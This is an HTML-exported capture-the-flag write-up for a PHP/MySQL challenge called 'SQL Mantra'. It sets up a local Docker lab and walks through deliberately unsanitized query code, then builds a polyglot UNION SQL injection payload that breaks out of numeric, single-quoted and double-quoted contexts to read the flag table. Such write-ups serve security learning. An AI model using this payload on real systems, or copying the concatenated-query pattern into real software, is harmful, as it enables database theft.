@@ -1,0 +1,165 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome file</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="sql-mantra">SQL Mantra</h1>
+<h2 id="attachments">Attachments</h2>
+<ul>
+<li>index.php</li>
+</ul>
+<h2 id="lets-dive-in">Let’s Dive In</h2>
+<p>By opening the provided <code>index.php</code> file, we can immediately spot a few interesting things right at the top:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token constant">DB_HOST_7</span><span class="token punctuation">,</span> <span class="token constant">DB_USER_7</span><span class="token punctuation">,</span> <span class="token constant">DB_PASS_7</span><span class="token punctuation">,</span> <span class="token constant">DB_NAME_7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+</code></pre>
+<p>We are clearly working with a database, highly suggesting a SQL Injection (SQLi) vulnerability. There is also no error reporting (<code>error_reporting(0)</code>), which is pretty suspicious. To understand what’s going on under the hood, let’s spin up a local testing container.</p>
+<h2 id="setting-up-the-local-environment">Setting Up the Local Environment</h2>
+<p>To create the challenge environment and debug it properly, I created the following configuration files:</p>
+<h4 id="config.php"><code>config.php</code></h4>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"DB_HOST_7"</span><span class="token punctuation">,</span> <span class="token string">"db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"DB_USER_7"</span><span class="token punctuation">,</span> <span class="token string">"challenge_user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"DB_PASS_7"</span><span class="token punctuation">,</span> <span class="token string">"challenge_password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"DB_NAME_7"</span><span class="token punctuation">,</span> <span class="token string">"challenge_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+</span></code></pre>
+<h4 id="dockerfile"><code>Dockerfile</code></h4>
+<pre class=" language-dockerfile"><code class="prism  language-dockerfile"><span class="token comment"># PHP &gt;= 8.x strict typing breaks the chall </span>
+<span class="token keyword">FROM</span> php<span class="token punctuation">:</span>7.4<span class="token punctuation">-</span>apache
+
+<span class="token keyword">RUN</span> docker<span class="token punctuation">-</span>php<span class="token punctuation">-</span>ext<span class="token punctuation">-</span>install mysqli &amp;&amp; docker<span class="token punctuation">-</span>php<span class="token punctuation">-</span>ext<span class="token punctuation">-</span>enable mysqli
+<span class="token keyword">COPY</span> src/ /var/www/html/
+<span class="token keyword">EXPOSE</span> 80
+
+</code></pre>
+<h4 id="docker-compose.yml-i-had-no-prior-experience-w-docker-compose-so-writing-and-understading-was-a-mess"><code>docker-compose.yml</code> (i had no prior experience w docker compose so writing and understading was a mess)</h4>
+<pre class=" language-yml"><code class="prism  language-yml"><span class="token key atrule">services</span><span class="token punctuation">:</span>
+  <span class="token key atrule">web</span><span class="token punctuation">:</span>
+    <span class="token key atrule">build</span><span class="token punctuation">:</span> .
+    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> "8888<span class="token punctuation">:</span>80" <span class="token comment"># burpsuite runs on 8080 :p</span>
+    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> db
+
+  <span class="token key atrule">db</span><span class="token punctuation">:</span>
+    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql<span class="token punctuation">:</span><span class="token number">5.7</span>
+    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token key atrule">MYSQL_DATABASE</span><span class="token punctuation">:</span> challenge_db
+      <span class="token key atrule">MYSQL_USER</span><span class="token punctuation">:</span> challenge_user
+      <span class="token key atrule">MYSQL_PASSWORD</span><span class="token punctuation">:</span> challenge_password
+      <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> root_password
+    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token string">"2345:3306"</span>
+    <span class="token comment"># initializing the DB and inserting the flag manually because having a init.sql file created a MySQL init race condition, crashing the DB</span>
+    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">&gt;</span><span class="token scalar string">
+      sh -c "echo \"DROP TABLE IF EXISTS flags; CREATE TABLE flags (id INT(6) UNSIGNED, flag VARCHAR(128) NOT NULL); INSERT INTO flags (id, flag) VALUES (837402,'flag{g00d_j0b_k1dd0_u_SQL_m4ntr@_1z_p0w3rfu11}');\" &gt; /docker-entrypoint-initdb.d/setup.sql &amp;&amp; exec docker-entrypoint.sh mysqld"</span>
+    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> db_data<span class="token punctuation">:</span>/var/lib/mysql
+
+<span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+  <span class="token key atrule">db_data</span><span class="token punctuation">:</span>
+
+</code></pre>
+<p>Perfect. We now have a working container running locally on port 8888.<br>
+Let’s understand <code>index.php</code> and start pwning.</p>
+<h2 id="code-analysis">Code Analysis</h2>
+<pre class=" language-php"><code class="prism  language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"missing parameter 'payload'!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>
+     <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"sleep"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token operator">||</span>
+     <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"BENCHMARK"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span>
+ <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"HAKKKKEERRR!!11!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+</code></pre>
+<p>The script starts by checking that the <code>payload</code> parameter exists and isn’t equal to <code>sleep</code> or <code>BENCHMARK</code>, therefore making basic Time-Based SQLi impossible.</p>
+<p>Next, it executes our input across three separate database queries with different structural encapsulations (numeric, single quotes, double quotes) without any sanitization and without using prepared statements:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span>
+     <span class="token variable">$con</span><span class="token punctuation">,</span>
+     <span class="token string">"SELECT flag FROM flags WHERE id="</span> <span class="token punctuation">.</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+ <span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "flag{...}": str</span>
+ <span class="token punctuation">}</span>
+ <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span>
+     <span class="token variable">$con</span><span class="token punctuation">,</span>
+     <span class="token string">"SELECT flag FROM flags WHERE id='"</span> <span class="token punctuation">.</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"'"</span><span class="token punctuation">,</span>
+ <span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+ <span class="token punctuation">}</span>
+ <span class="token variable">$third</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span>
+     <span class="token variable">$con</span><span class="token punctuation">,</span>
+     <span class="token string">'SELECT flag FROM flags WHERE id="'</span> <span class="token punctuation">.</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"payload"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">,</span>
+ <span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$third</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token variable">$third</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+ <span class="token punctuation">}</span>
+
+</code></pre>
+<p>So here it gets interesting. It runs 3 queries without sanitization, cool.<br>
+But what’s up with the <code>while</code> loops?</p>
+<p>Inside each loop, the script uses <code>mysqli_fetch_array()</code> to fetch the row, but notice how the result object variable (<code>$first</code>, <code>$second</code>, <code>$third</code>) is <strong>overwritten</strong> with the literal flag string: <code>$first = $row["flag"];</code>.</p>
+<p>Finally, it checks if all three variables hold the exact same string value, and if so, prints the flag:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>
+     <span class="token variable">$first</span> <span class="token operator">===</span> <span class="token variable">$second</span> <span class="token operator">&amp;&amp;</span>
+     <span class="token variable">$second</span> <span class="token operator">===</span> <span class="token variable">$third</span> <span class="token operator">&amp;&amp;</span>
+     <span class="token variable">$first</span> <span class="token operator">===</span> <span class="token string">"flag{g00d_j0b_k1dd0_u_SQL_m4ntr@_1z_p0w3rfu11}"</span>
+ <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     <span class="token keyword">print</span> <span class="token string">"flag{g00d_j0b_k1dd0_u_SQL_m4ntr@_1z_p0w3rfu11}"</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+     <span class="token comment">// prints the queries...</span>
+ <span class="token punctuation">}</span>
+
+</code></pre>
+<h2 id="the-solution">The Solution:</h2>
+<p>Let’s refresh how the server makes the Queries, for <code>payload=1</code></p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span>  
+<span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span>  
+<span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">"1"</span>
+
+</code></pre>
+<p>Ok but what happens if we try to close those?</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags<span class="token comment">-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -</span>
+
+</code></pre>
+<p>Substituting our payload into all three queries:</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token comment">-- query 1 (raw)</span>
+<span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags<span class="token comment">-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -</span>
+
+<span class="token comment">-- query 2 (single-quoted)</span>
+<span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'0 UNION SELECT flag FROM flags-- -'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags<span class="token comment">-- -" UNION SELECT flag FROM flags-- -'</span>
+
+<span class="token comment">-- query 3 (double-quoted)</span>
+<span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">"0 UNION SELECT flag FROM flags-- -' UNION SELECT flag FROM flags-- -"</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags<span class="token comment">-- -"</span>
+
+</code></pre>
+<p>Let’s go through each one.</p>
+<p><strong>Q1</strong> has no wrapping quotes, so the payload lands directly as SQL. <code>-- -</code> comments out the rest (the stray <code>'</code> and <code>"</code> and everything after), leaving:</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> flag <span class="token keyword">FROM</span> flags
+
+</code></pre>
+<p><code>id=0</code> matches nothing, but the <code>UNION</code> appends every row from <code>flags</code> returning the flag.</p>
+<p><strong>Q2</strong> wraps our payload in single quotes. Our embedded <code>'</code> (right after <code>-- -</code>) closes the server’s opening quote early, breaking out of the string. MySQL then sees:</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token comment">-- this part is just a string literal:  '0 UNION SELECT flag FROM flags-- -'</span>
+<span class="token comment">-- this part is SQL:               UNION SELECT flag FROM flags-- -"...</span>
+
+</code></pre>
+<p>The string <code>'0 UNION SELECT flag FROM flags-- -'</code> coerces to integer <code>0</code>, but the <code>UNION</code> after it runs freely and returns the flag. The trailing <code>-- -</code> comments out the leftover <code>"</code> and closing <code>'</code> the server appended.</p>
+<p><strong>Q3</strong> wraps our payload in double quotes. Same thing, our embedded <code>"</code> closes the server’s opening double-quote, and the final <code>UNION SELECT flag FROM flags</code> runs as live SQL. The trailing <code>-- -</code> eats the server’s leftover closing <code>"</code>.</p>
+<p>All three queries return the flag row, <code>$first === $second === $third === "flag{...}"</code> passes, and the flag is printed.</p>
+</div>
+</body>
+
+</html>
